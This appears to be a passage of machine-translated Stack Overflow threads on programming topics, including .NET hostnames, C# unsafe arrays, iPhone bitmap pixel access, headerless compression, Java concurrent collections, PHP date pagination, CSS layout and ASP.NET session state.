
Must admit I haven't tryed it out yet my self but [quickgraph](http://www.codeplex.com/quickgraph) looks promissing

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-08-26T08:07:36.753

@Rune FS

QuickGraph has no visualisation capabilities, at least not for Silverlight. It just handles the graph data structures and algorithms.

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2010-08-11T05:56:14.410

QuickGraph does make it easy to construct a graph and output to Directed Graph Markup Language (DGML) which can be viewed in VS 2010\. I just checked in changes to the project and I noticed that it has been designed to be built for inclusion into Silverlight. So perhaps you could use it in conjunction with a silverlight DGML viewer

# .net - 在 .NET 中获取不合格的主机名

> ID：561657
> 
> 赞同：1
> 
> 时间：2009-02-18T15:51:03.607
> 
> 标签：.net, .net-2.0, dns, fqdn

是否有[`GetNameInfoW()`](http://msdn.microsoft.com/en-us/library/ms738531(VS.85).aspx)与设置了`NI_NOFQDN`标志的 winsock 函数等效的 .NET？正如 MSDN 文档`GetNameInfoW`解释的那样：

> 设置 NI_NOFQDN 标志会导致本地主机仅在 pNodeBuffer 参数中返回其相对可分辨名称 (RDN)。

我能找到的最接近的是`System.Net.Dns.GetHostEntry()`，它返回一个`IPHostEntry`但其`HostName`是主机的*完全*限定域名。我只想要不合格的主机名。

例如，如果 IP 地址“xxxx”解析为 FQDN“foohost.company.domain.com”，我可以`GetNameInfoW()`通过提供来获取“foohost” `NI_NOFQDN`，但在 .NET 中似乎没有等效项。我不确定是否`GetNameInfoW()`在做 NetBIOS 或 LDAP 或其他东西。关于如何在 .NET 中执行相同操作的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T16:29:49.817

Are you trying to get the computer's name, or the DNS name for the computers IP (sometimes different). If you really wanted to use GetNameInfoW() you could always just use Pinvoke from .NET.

**Edit:** This might be a hack, but could you use the result from System.Net.Dns.GetHostEntry() and just do a string.Split('.') and take index 0 as the unqualified name?

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-02-19T07:36:26.470

如果计算机有多个 IP 地址，它也可以有多个主机名（在这种情况下完全限定与否无关紧要）。

如果我需要“计算机名称”，我过去使用“Environment.MachineName”，从技术上讲，它会返回机器的 NetBIOS 名称，但至少这不依赖于 IP 配置。

# c# - 将任意值类型的数组作为形参

> ID：561661
> 
> 赞同：4
> 
> 时间：2009-02-18T15:52:07.067
> 
> 标签：c#, declaration, value-type

我希望能够将函数声明为

```
void foo(<any value type>[] data){} 
```

在 C# 2.0 中。如果我将其声明为

```
void foo(ValueType[] data){} 
```

它可以编译，但是 data[] 中的元素被视为派生自`object`，例如，我不能说类似

```
fixed (void* pData = data){} 
```

我想避免将 void* 作为参数——我只想能够接受任何值类型的数组，然后对其执行非托管操作。

ETA：另外，这也有同样的问题：

```
public static unsafe void foo<T>(T[] data) where T:struct{
  fixed(void *p = data){}
} 
```

万一你想知道。修复失败，因为它被视为托管类型 - CS0208，无法声明指向托管类型的指针。见下文“毫米”。我认为他是对的......这可能只是无法完成。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-19T00:50:52.233

我认为使用 C# 是不可能的。直到编译时间之后，结构才从 System.ValueType 继承（尽管松散），因此您无法通过多态性匹配 Foo 的方法签名。根据语言规范，泛型也已发布：

> “非托管类型是任何不是引用类型、**类型参数**或通用结构类型的类型，并且不包含类型不是非托管类型的字段。”

这就是为什么无论结构约束如何都不能获取 T[] 的地址的原因。

您可以声明一个结构类型（例如 Bar）作为 Foo 的参数，编译代码，并在 IL 级别更改方法签名：

`.method private hidebysig static void Foo(valuetype [mscorlib]System.ValueType[] args) cil managed`

然后也调用：

`IL_0020: call void ConsoleApplication1.Program::Foo(valuetype [mscorlib]System.ValueType[])`

虽然我能够运行生成的程序，但我不知道这会产生什么样的副作用。此外，即使您可以引用修改后的函数，您也无法从 C# 调用它，因为在编译之前结构不会从 System.ValueType 继承，因此方法签名不匹配。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-18T21:37:19.453

```
public void foo<T>(params T[] args) where T : struct {
}
public void SomeMethod() {
    foo(1, 2, 3, 4);
} 
```

您不必输入泛型参数，因为编译器将从 foo 的第一个参数中获取类型。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2009-02-18T21:26:02.583

这会起作用：

```
 public static void foo(System.Array data)
    {

    }

    static void Main(string[] args)
    {
        foo(new int[10]);  
    } 
```

它不强制数组是值类型的数组，但它会起作用。

# iphone - 如何从 iPhone 上的 BitmapContext 中提取 ARGB 组件？

> ID：561663
> 
> 赞同：3
> 
> 时间：2009-02-18T15:52:13.713
> 
> 标签：iphone, image, colors, bitmap, rgb

我正在尝试使用以下代码从 CGBitmapContext 获取 ARGB 组件：

```
 -(id) initWithImage: (UIImage*) image   //create BitmapContext with UIImage and use 'pixelData' as the pointer
{

        CGContextRef    context = NULL;
        CGColorSpaceRef colorSpace;
        int             bitmapByteCount;
        int             bitmapBytesPerRow;

        bitmapBytesPerRow   = (image.size.width * 4);                       
        bitmapByteCount     = (bitmapBytesPerRow * image.size.height);

        colorSpace = CGColorSpaceCreateDeviceRGB();                         
        pixelData = malloc( bitmapByteCount );      //unsigned char* pixelData is defined in head file
        context = CGBitmapContextCreate (pixelData,                         
                        image.size.width,
                        image.size.height,
                        8,    // bits per component
                        bitmapBytesPerRow,
                        colorSpace,
                        kCGImageAlphaPremultipliedFirst
                        );
        CGColorSpaceRelease( colorSpace );                                  

        CGContextDrawImage(context, CGRectMake(0, 0, image.size.width, image.size.height), image.CGImage);
        pixelData = CGBitmapContextGetData(context);
        return self;
} 
```

```
 -(float) alphaAtX:(int)x y:(int)y   //get alpha component using the pointer 'pixelData' 
{
    return pixelData[(y *width + x) *4 + 3];    //+0 for red, +1 for green, +2 for blue, +3 for alpha
}

-(void)viewDidLoad {
    [super viewDidLoad];
    UIImage *img = [UIImage imageNamed:@"MacDrive.png"];    //load image

```
[self initWithImage:img];   //create BitmapContext with UIImage
float alpha = [self alphaAtX:20 y:20];  //store alpha component 
```

} 
```

当我尝试存储红/绿/蓝时，结果总是 240。而 alpha 总是 255。

所以我认为指针可能有问题。它无法返回我想要的正确 ARGB 数据。关于代码有什么问题的任何想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-26T12:26:15.890

首先，您正在泄漏内存，pixelData 内存永远不会被释放。

对于您的使用，最好让 CGContext 调用管理内存。只需传递 NULL iso pixelData，只要您在上下文中保持引用计数，`CGBitmapContextGetData(context)`它将保持有效。

您使用 alpha 就好像它是最后一个条目（RGBA，而不是 ARGB），在创建上下文时使用它，或者调整`alphaAtX`代码。我不确定你是否想要预乘，如果只是为了检查 alpha 值，你不需要。

总而言之，像：

```
[...]
CGContextRelease(context);
context = CGBitmapContextCreate (NULL,                                                     
                                    image.size.width,
                                    image.size.height,
                                    8,    // bits per component
                                    bitmapBytesPerRow,
                                    colorSpace,
                                    kCGImageAlphaLast
                                    );
CGColorSpaceRelease( colorSpace );                                                                      

CGContextDrawImage(context, CGRectMake(0, 0, image.size.width, image.size.height), image.CGImage);
pixelData = CGBitmapContextGetData(context);
[...] 
```

context 是一个成员变量，初始化为 NULL，这已经是朝着正确方向迈出的一步。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-21T00:34:10.090

首先，我会检查从您的调用返回的上下文`CGBitmapContextCreate`是否有效（即确保`context != NULL`）。我还会检查以确保您最初加载的图像有效（因此，请确保`img != nil`）。

如果您的上下文为 nil，可能是因为您的图像大小不合理，或者您的像素数据格式不可用。尝试`kCGImageAlphaPremultipliedLast`改用？

其次，您不需要使用`CGBitmapContextGetData`- 您可以只使用`pixelData`您首先传入的指针。在离开函数之前，您还应该使用`CGContextRelease`上下文`initWithImage:`以避免泄漏。

我还注意到您正在使用`kCGImageAlphaPremultipliedFirst`. 这意味着 alpha 组件在您的图像中是*first*，而不是 last ，因此您希望`alphaAtX:y:`函数中的 alpha 组件的偏移量为 0 。

这些有帮助吗？

# algorithm - 我在哪里可以找到产生无头输出的无损压缩算法？

> ID：561664
> 
> 赞同：6
> 
> 时间：2009-02-18T15:52:31.327
> 
> 标签：algorithm, compression, lossless-compression

你们中有人知道产生无头输出的无损压缩算法吗？例如不存储用于压缩的霍夫曼树吗？我不谈论硬编码的霍夫曼树，但我想知道是否有任何算法可以压缩和解压缩输入而不在其输出中存储一些元数据。或者这在理论上是不可能的？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-02-18T16:04:15.760

当然这是可能的。其中，LZ 系列压缩器不需要输出压缩数据本身以外的任何内容，因为字典是在压缩（或解压缩）过程中在线构建的。对于那些 LZ 类型的算法，您有很多参考实现。例如，[LZMA](http://en.wikipedia.org/wiki/LZMA)， 7zip 的组件。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-02-18T15:58:38.817

[运行长度编码](http://en.wikipedia.org/wiki/Run-length_encoding)就是一个例子

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2009-02-26T03:12:20.293

[自适应霍夫曼编码](http://en.wikipedia.org/wiki/Adaptive_Huffman_coding)正是这样做的。更一般地，术语[**自适应编码**](http://en.wikipedia.org/wiki/Adaptive_coding)用于描述具有此属性的[熵码。](http://en.wikipedia.org/wiki/Entropy_encoding)一些[字典代码](http://en.wikipedia.org/wiki/Dictionary_coder)也具有此属性，例如[游程编码 (RLE)](http://en.wikipedia.org/wiki/Run-length_encoding)和[Lempel-Ziv-Welch (LZW)](http://en.wikipedia.org/wiki/Lempel-Ziv-Welch)。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-18T16:43:36.850

我想到了[lzo 。](http://www.oberhumer.com/opensource/lzo/)在OpenVPN中使用，效果很好

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-01T14:31:13.513

为什么要寻找具有无头压缩输出的压缩算法？

也许（a）您有一个需要低延迟流压缩/解压缩的系统，例如 2 路电话。Zach Scrivena 提到的自适应编码类压缩算法和 Diego Sevilla 和 Javier 提到的 LZ 系列[字典压缩](http://en.wikibooks.org/wiki/Data_Compression/Dictionary_compression)算法非常适合这类应用。这些算法的实际实现通常在开始时*确实*有一两个字节的元数据（使它们对 (b) 应用程序无用），但这对延迟几乎没有影响。

也许（b）您主要对密码学感兴趣，并且您听说 compress-before-encrypt 提供了一些改进的安全属性，只要压缩文本没有固定的元数据标头“crib”。现代加密算法（据我们所知）不易受到此类“婴儿床”的影响，但如果您偏执，您可能会对“双射压缩”（[a](http://datacompression.dogma.net/index.php?title=FAQ:What_does_bijective_mean_with_regards_to_data_compression?)，[b](http://www3.sympatico.ca/mt0000/bicom/)，[c](http://bijective.dogma.net/)等）感兴趣。当接收器获得这样的压缩输出时，不可能检测到传输中的错误（翻转位、插入位、删除位等）（使得这些算法对 (a) 应用程序不是特别有用）。

也许（c）您出于其他原因对无头压缩感兴趣。听起来很吸引人——那是什么原因？

# java - 控制对 Java 集合的并发访问的最佳方法

> ID：561671
> 
> 赞同：27
> 
> 时间：2009-02-18T15:53:08.110
> 
> 标签：java, collections, concurrency

我应该使用旧的同步向量集合、具有同步访问的 ArrayList 还是 Collections.synchronizedList 或其他一些并发访问的解决方案？

我在相关问题和搜索中都没有看到我的问题（[让您的收藏成为线程安全的？](https://stackoverflow.com/questions/164088/make-your-collections-thread-safe "让您的收藏成为线程安全的？")不一样）。

最近，我不得不对我们应用程序的 GUI 部分进行单元测试（基本上使用 API 来创建框架、添加对象等）。因为这些操作的调用速度比用户调用的快得​​多，所以它显示了方法尝试访问尚未创建或已删除的资源的许多问题。

在 EDT 中发生的一个特殊问题来自于遍历视图的链接列表，同时在另一个线程中更改它（在其他问题中获得 ConcurrentModificationException）。不要问我为什么它是一个链表而不是一个简单的数组列表（甚至更少，因为我们通常在里面有 0 或 1 个视图......），所以我在我的问题中采用了更常见的 ArrayList（因为它有一个表弟）。

无论如何，对并发问题不是很熟悉，我查了一些信息，想知道在旧的（可能已经过时的）Vector（它在设计上具有同步操作）和带有`synchronized (myList) { }`关键部分的 ArrayList（添加/删除）之间选择什么/walk 操作）或使用 Collections.synchronizedList 返回的列表（甚至不确定如何使用后者）。

我最终选择了第二个选项，因为另一个设计错误是暴露对象（getViewList() 方法...）而不是提供使用它的机制。

但是其他方法的优缺点是什么？

* * *

[编辑] 这里有很多好的建议，很难选择一个。我会选择更详细的并提供链接/思想的食物...... :-) 我也喜欢达伦的那个。

总结一下：

*   正如我所怀疑的那样，Vector（以及它的邪恶双胞胎，可能还有 Hashtable）在很大程度上已经过时了，我看到人们说它的旧设计不如新集合好，除了在单线程环境中强制同步的缓慢之外. 如果我们保留它，主要是因为旧的库（和 Java API 的一部分）仍在使用它。
*   与我想的不同，Collections.synchronizedXxxx 并不比 Vector 更现代（它们似乎是 Collections 的现代版本，即 Java 1.2！），实际上并没有更好。很高兴知道。简而言之，我也应该避免它们。
*   毕竟手动同步似乎是一个很好的解决方案。可能存在性能问题，但就我而言，这并不重要：对用户操作进行的操作、小集合、不经常使用。
*   java.util.concurrent 包值得牢记，尤其是 CopyOnWrite 方法。

我希望我做对了...... :-)

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2009-02-18T21:31:21.027

Vector 和 Collections.synchronizedList() 返回的 List 在道德上是一回事。我认为 Vector 被有效地（但实际上不是）弃用，并且总是更喜欢同步列表。一个例外是需要 Vector 的旧 API（尤其是 JDK 中的 API）。

使用裸 ArrayList 和独立同步使您有机会更精确地调整同步（通过在互斥块中包含其他操作或将多个对 List 的调用放在一个原子操作中）。不利的一面是，可以编写在同步之外访问裸 ArrayList 的代码，这是被破坏的。

您可能要考虑的另一个选项是 CopyOnWriteArrayList，它可以像 Vector 和同步 ArrayList 一样为您提供线程安全，但也可以提供不会抛出 ConcurrentModificationException 的迭代器，因为它们正在处理数据的非实时快照。

您可能会发现最近关于这些主题的一些博客很有趣：

*   [Java 并发错误 #3 - atomic + atomic != atomic](http://tech.puredanger.com/2009/01/30/java-concurrency-bugs-atomic/)
*   [Java 并发错误 #4：ConcurrentModificationException](http://tech.puredanger.com/2009/02/02/java-concurrency-bugs-concurrentmodificationexception/)
*   [CopyOnWriteArrayList 并发乐趣](http://tech.puredanger.com/2009/02/02/copyonwritearraylist-concurrency-fun/)

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2009-02-18T21:54:30.880

我强烈推荐《[Java Concurrency in Practice](http://jcip.net)》一书。

每个选择都有优点/缺点：

1.  矢量 - 被认为是“过时的”。与更主流的集合相比，它可能得到更少的关注和错误修复。
2.  您自己的同步块 - 很容易出错。通常提供比以下选择更差的性能。
3.  Collections.synchronizedList() - 专家完成的选择 2。这仍然不完整，因为需要原子的多步操作（获取/修改/设置或迭代）。
4.  来自 java.util.concurrent 的新类 - 通常具有比选择 3 更有效的算法。关于多步操作的类似警告也适用，但通常会提供帮助您的工具。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2009-02-18T16:20:16.737

我想不出一个很好的理由来更`Vector`喜欢`ArrayList`。a 上的列表操作`Vector`是同步的，这意味着多个线程可以安全地更改它。就像你说的，ArrayList 的操作可以使用`Collections.synchronizedList`.

请记住，即使使用同步列表，`ConcurrentModificationExceptions`如果在另一个线程修改集合时迭代集合，您仍然会遇到。因此，在外部协调访问非常重要（您的第二个选项）。

用于避免迭代问题的一种常用技术是迭代集合的不可变副本。看`Collections.unmodifiableList`

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2009-02-18T16:34:54.703

我总是先去 java.util.concurrent ( [http://java.sun.com/javase/6/docs/api/java/util/concurrent/package-summary.html](http://java.sun.com/javase/6/docs/api/java/util/concurrent/package-summary.html) ) 包看看有没有合适的收藏。java.util.concurrent.CopyOnWriteArrayList 类如果您对列表进行少量更改但进行更多迭代，则该类很好。

我也不相信 Vector 和 Collections.synchronizedList 会阻止 ConcurrentModificationException。

如果您没有找到合适的集合，那么您必须自己进行同步，如果您不想在迭代时持有锁，您可能需要考虑制作副本并迭代副本。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-02-18T16:02:39.790

我不相信`Iterator`Vector 返回的值以任何方式同步 - 这意味着`Vector`不能保证（就它自己）一个线程没有修改底层集合，而另一个线程正在迭代它。

我相信要确保迭代是线程安全的，您必须自己处理同步。假设同一个 Vector/List/object 被多个线程共享（从而导致您的问题），您不能只在该对象本身上进行同步吗？

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-02-18T16:53:31.757

最安全的解决方案是完全避免对共享数据的并发访问。不要让非 EDT 线程对相同的数据进行操作，而是让它们调用`SwingUtilities.invokeLater()`Runnable 来执行修改。

说真的，共享数据并发是一个毒蛇的巢穴，你永远不会知道是否有另一个竞争条件或死锁隐藏在某个地方，等待它在最糟糕的情况下咬你的屁股。

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2009-02-18T21:24:50.543

CopyOnWriteArrayList 值得一看。它是为通常读取的列表而设计的。每次写入都会导致它在封面后面创建一个新数组，因此那些遍历数组的人不会得到 ConcurrentModificationException

# php - PHP 日期相关分页

> ID：561694
> 
> 赞同：1
> 
> 时间：2009-02-18T15:58:33.870
> 
> 标签：php, sql, html, pagination, paging

我有一个站点，它在 sql 数据库中存储了一堆记录，我想根据日期将其拉到页面上，该日期在 sql 中存储为 Ymd。但是，我想根据天对结果进行分页。

所以对于索引，我想显示当天的所有结果，为此我将使用 php date() 函数作为我的查询中的 WHERE。但是我在进行分页时遇到了障碍。我想在底部有一个按钮，可以通过 get 转到下一页，所以 index.php?page=2 将是明天，但我无法弄清楚如何从我的 WHERE 中的数据库中可靠地选择“明天”。

看，我打算使用 date("U") 在第一页上以秒为单位获取 unix 时间，然后添加 3600*$_GET['page'] 以增加下一页上的日期，但这似乎是一种草率的做法，可能会弄乱我。这是唯一的方法还是有更好，更实用的解决方案 - 非常感谢我很感激的人。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-18T16:07:33.943

如果第 2 页是明天，那么您将看到如下内容：

```
$days_ahead = $page - 1;
$query = "... WHERE date = DATE(NOW()) + INTERVAL $days_ahead DAY ..."; 
```

请注意，这在第一页上也可以正常工作（假设 $page 被默认为 1），它会将 0 天添加到今天的日期。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-18T16:08:05.627

你用 strtotime 做实验：

```
$sqldate = date('Y-m-d', strtotime('+2 days')); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-12T11:22:13.187

这就是我设法为我的网站修复它的方法

```
//'page' is a GET variable from url
if($page<=1) {
  $datemax = time();
  $datemin = time() - (1 * 2592000); //2592000 being seconds in a month
}
else{
  $datemax = time() - (($page - 1) * 2592000);
  $datemin = time() - ($page * 2592000);
} 
```

然后显然查询看起来像

```
SELECT * FROM posts WHERE dateposted >=$datemin AND dateposted <=$datemax 
```

# javascript - 有没有办法阻止网络浏览器的关闭？

> ID：561697
> 
> 赞同：4
> 
> 时间：2009-02-18T15:58:48.893
> 
> 标签：javascript, browser

两年前，我需要将 Web 浏览器的关闭作为 Web 应用程序的 javascript 事件来捕获。当时我发现没有办法对所有浏览器都有效。IE 有一个我可以使用的事件，但它是 IE 特定的。我查看了其他解决方法，例如对服务器的心跳之类的 ping，但当时我不喜欢其中任何一个。

无论如何，现在是否可以捕获关闭网络浏览器？谢谢！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-02-18T16:01:51.630

您可以使用

```
window.onbeforeunload 
```

javascript 事件来执行此操作，尽管这将捕获的不仅仅是关闭浏览器。每次有人尝试导航到另一个页面、刷新当前页面等时，也会触发此事件。如果您尝试执行诸如在人们离开当前页面之前警告未保存的更改之类的操作，这将非常方便。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-18T16:01:29.777

[onunload](http://www.w3schools.com/jsref/jsref_onunload.asp)适用于 IE 和 Firefox。

# html - 需要两个 div 才能正确排列

> ID：561700
> 
> 赞同：0
> 
> 时间：2009-02-18T15:59:16.020
> 
> 标签：html, css, positioning

[这是两个 div 的阵容的屏幕截图](http://img410.imageshack.us/img410/1425/picture2ye4.png)。

左列是，我想在它右边排列的 div 是

并且这两个 div 都在

```
.content-body {
    padding:10px 15px;
    font-size:.8em;
    font-family:arial;
    overflow:auto;
}

.col-left {
    float:left;
    position:relative;
    overflow:auto;
    height:100%;
    width:20%;
    padding:0 5px 0 0;
}

.col-middle {
    width:auto;
    height:auto;
    float:left;
    xmargin-top:5px;
    xfont-size:.8em;
    border:1px solid red;
    font-family:arial;
} 
```

如何让 .col-middle div 正确排列？

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-18T16:03:58.583

*将.col-middle*的宽度更改为*80% 或更小*，以便两个 div 都可以放入它们的容器中。

你也可以让*.col-middle**向右*浮动。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-18T16:44:04.603

另一种选择（虽然你真的应该给右列一个宽度）：

```
 .col-middle {
        ...
        margin-left: 20%;
    } 
```

**编辑：**如果你给 .col-middle 一个左边距，没有必要浮动它或给它一个宽度

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-18T16:04:05.073

添加一个

```
clear:none; 
```

对你们两个列 div

和一个

```
width:80%; 
```

到您的中间栏应该使他们能够并排:)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-10-29T23:23:50.783

col-middle 采用宽度：100%，因此您必须提供宽度：小于 80%。

您可以做的另一个解决方案是让 width:79% 并删除 float:left 并使其显示：table-cell;

```
.col-middle {
  width: 79%
  height:auto;
  display: table-cell;
  xmargin-top:5px;
  xfont-size:.8em;
  border:1px solid red;
  font-family:arial;
} 
```

# javascript - 在 javascript 中，您将如何构建一个将值 A 与值 B 进行比较的方法

> ID：561702
> 
> 赞同：1
> 
> 时间：2009-02-18T15:59:50.607
> 
> 标签：javascript, arrays, object

我有一个对象数组，如下所示：

```
var myArray = [
   { 'name' : 'some name', id: 23131, 'has' : ['dogs'] },
   { 'name' : 'some name 2', id: 8678, 'has' : ['dogs', 'cats'] },
   { 'name' : 'some name 3', id: 2125 , 'has' : ['donkeys', 'goats']},
   { 'name' : 'some name 4', id: 90867, 'has' : ['parrots', 'treasure'] },
   { 'name' : 'some name 5', id: 435458, 'has' : undefined },
]; 
```

我想检索符合某些条件的特定元素。例如，一个人的名字包含数字 5，id 是 435458。或者一个人有一只鹦鹉或一只山羊，或两者兼有。

我正在尝试构建的方法有两个参数，值 A 和值 B。值 A 是一个对象，例如`{ 'name' : '5' }`or `{ 'name' : /5/ }`or `{ 'name' : 5 }`or { 'has' : 'goats' }，值 B 是要匹配的对象，即`myArray`.

该方法很快变得相当复杂，我觉得我的代码没有它可以的那么有效和高效。

我认为实现这一点的最佳方法是遍历传递和找到的对象和数组（`myArray`数组`has`），并调用它自己，直到只有两个字符串/数字/正则表达式值需要比较。但我不太确定如何最好地实现这一目标。或者这不是最好的方法吗？此外，速度是一个重要的成功标准。

干杯

编辑： http: [//jsbin.com/ediye/edit](http://jsbin.com/ediye/edit)包含我现在正在使用的函数，我认为它的工作原理如上所述，但对于大型数据集来说它相当慢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-02-27T16:26:14.357

好的，我看到很多人对此感兴趣，所以这是我目前所拥有的：

```
var filter = function(what,where) {
    var sameArrays = function(arr,arr1) {
        var al = arr.length, bl = arr1.length;
        if (al !== bl || al === 0 || bl === 0) { return; }
        for (var i = al - 1; i >= 0; i--){
            if (!match(arr[i], arr1[i])) { return; }
        }
        return arr1;
    };

    var sameObjects = function(obj,obj1) {
        for (var i in obj) {
            if(!obj1.hasOwnProperty(i)){return;}
            if (!match(obj[i],obj1[i])) {return;}
        }
        return obj1;
    };

    var inArray = function(value,obj) {
        var r = [],
            m = match;

        for (var i = obj.length - 1; i >= 0; i--){
            var item = obj[i];
            if( m(value,item) ) {
                r.push( item );
            }
        };

        return (r.length) ? r : undefined ;
    };

    var inObject = function(value,obj) {
        var r = [],
            m = match;

        for(var i in obj){
            var item = obj[i];
            if( m(value,item) ) {
                r.push( item );
            }
        };

        return (r.length) ? r : undefined ;
    };

    var inString = function(value,string) { 
        var valueConstructor = value.constructor;

        if( valueConstructor === RegExp) {
            return (value.test(string)) ? string : undefined ; }

        else if( valueConstructor === Function && value(string) === true ) {
            return string; }

    };

    var match = function(a,b) {
        if(typeof a === 'undefined' || typeof b === 'undefined' || a === null || b === null) {
            return; }

        if (a == b) { 
            return b;}

        var vc = a.constructor,
            oc = b.constructor;

    // Cannot compare array or object to a string or a number
        if( (vc === Array || vc === Object) && (oc === String || oc === Number) ) {
            return; }

        if( oc === Array && vc === Array ) {
            return sameArrays(a,b); }
        else if(oc === Array) {
            return inArray(a,b); }
        else if (oc === Object && vc === Object) {
            return sameObjects(a,b); }
        else if (oc === Object) {
            return inObject(a,b); }         
        else if (vc === Object || vc === Array) {
            return; }
        else if (oc === String || oc === Number){
            return inString(a,b); }

    };

    return match(what,where);
}; 
```

它允许您执行以下操作：

```
var b = [
   { 'name' : 'some name', age: 23, id: 0, 'has' : ['dogs'] },
   { 'name' : 'some name 2', age:24, id: 1, 'has' : ['dogs', 'cats'] },
   { 'name' : 'some name 3', age: 25, id: 2 , 'has' : ['donkeys', 'goats']},
   { 'name' : 'some name 4', age:26, id: 3, 'has' : ['parrots', 'treasure'] },
   { 'name' : 'some name 5', age:27, id: 4, 'has' : undefined }
];

filter({ age:23 },b)

filter({ age:'24' },b)

filter({ name: /\d$/ },b)

filter('dogs',b)

filter({ has: 'goats' },b) 
```

这是我一直在研究的某种 js 库的一部分，所以如果你发现使用 json + dom 尝试在谷歌代码中搜索**jdatastore**。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-18T16:22:20.910

您只需要过滤数组。

```
var matchedItems = myArray.filter(function(item) {
    return (item.name.indexOf("5") !== -1) && (item.id === 435458);
}); 
```

不幸的是，过滤方法是 JS 1.6 并且在 IE 中尚不支持。然而，几乎所有的框架都有某种使用类似想法的过滤机制。如果您不想使用框架，这里有一个来自[Mozilla 网站](https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Array/filter)的解决方案：

```
if (!Array.prototype.filter)
{
  Array.prototype.filter = function(fun /*, thisp*/)
  {
    var len = this.length;
    if (typeof fun != "function")
      throw new TypeError();

    var res = new Array();
    var thisp = arguments[1];
    for (var i = 0; i < len; i++)
    {
      if (i in this)
      {
        var val = this[i]; // in case fun mutates this
        if (fun.call(thisp, val, i, this))
          res.push(val);
      }
    }

    return res;
  };
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T16:25:54.600

在我看来，您尝试做的事情完美地映射到某些数据库查询。

为了提高效率，最好将此选择代码移动到可以使用 SQL 查询的服务器。

# asp.net - ASP .NET 会话状态的“InProc”与“StateServer”的最佳实践

> ID：561705
> 
> 赞同：6
> 
> 时间：2009-02-18T16:00:23.257
> 
> 标签：asp.net

我们有一个 ASP .NET 应用程序在单个 Web 服务器（无场）上运行。目前，我们使用默认的“InProc”会话存储。是否值得考虑改用 ASP .NET 状态服务？如果我们走这条路，我们很可能只是在与应用程序相同的机器上运行服务本身，因此通过网络进行调用以获取和设置会话信息不会成为问题。我们之所以考虑这一点，是为了帮助避免在应用程序池回收时丢失会话数据。

此外，目前使用 SQL Server 是不可能的，所以我们只是在谈论进程内服务器与状态服务器。

在这种情况下，每种模式的优缺点是什么？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-02-18T16:06:03.900

好吧，状态服务器比 proc 慢一点。您从中获得的好处是，如果您需要回收应用程序池，那么应用程序的状态（用户会话等）将不受影响。如果你将来打算使用状态服务器，我现在就开始使用它。在进程中，对象按原样存储在内存中，但在状态服务器中，它们是序列化的。如果您打算稍后进行切换，这可能是一件大事，因为您必须检查您存储在 state 中的所有内容是否都是可序列化的。如果您从这种限制开始，您就会预先知道（当您正在积极处理该模块时）什么会起作用，什么不会起作用。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-18T16:04:35.743

我认为这是[YAGNI](http://www.codinghorror.com/blog/archives/000111.html)的一个经典案例。

InProc 简单有效。除非对单独的状态服务有特定需求，否则您为什么会考虑做出这样的改变？确实，如果您将站点分布在多台服务器上，唯一真正的优势就出现了——而且您*没有*将站点分布在多台服务器上，这很可能是白费力气。即使您非常确定*最终会*迁移到多台服务器，我也不会进行切换，除非并且直到启动第二台服务器的时候。再次阅读 YAGNI 链接上的文章以了解原因。

相反，请使用您将节省的时间来改进您的网站......

有关您的替代品的更多信息，请参见[此处](http://support.microsoft.com/kb/307598)...

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-06T20:20:58.460

无论如何，我总是很喜欢使用 StateService。我们过去只使用 InProc，但事实证明（显然）有各种奇怪的方式可以在您不知道的情况下回收 appPool。

由于某种莫名其妙的回收行为，我们曾经让客户在网络系统中每周一次左右失去他们的会话。一旦我们切换到 StateService，我们就再也没有遇到过这个问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-18T16:03:33.250

我喜欢使用 StateService 仅仅是因为如果您确实需要跨多个服务分发您的应用程序，那么更改它就少了一件事情。它允许您在不丢失所有会话的情况下回收 IIS。虽然这对于只有一台服务器来说并不是那么有用，但它看起来很不错。

我的理由比其他任何事情都更普遍。但我从来没有遇到过问题。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-02-05T16:41:55.990

如果我错了，请纠正我，但从我读到的内容来看，还有另一个优点/缺点：

*   **inproc**强制使用单个工作进程，从而在回收时丢失会话状态
*   **stateserver** 允许使用网络花园（即配置应用程序池以运行例如 4 个工作人员）

# .net - 无法使用 VS2008 SP1 进入 .NET 框架源

> ID：561724
> 
> 赞同：14
> 
> 时间：2009-02-18T16:04:05.743
> 
> 标签：.net, visual-studio-2008, debugging, visual-studio-2008-sp1, source-server

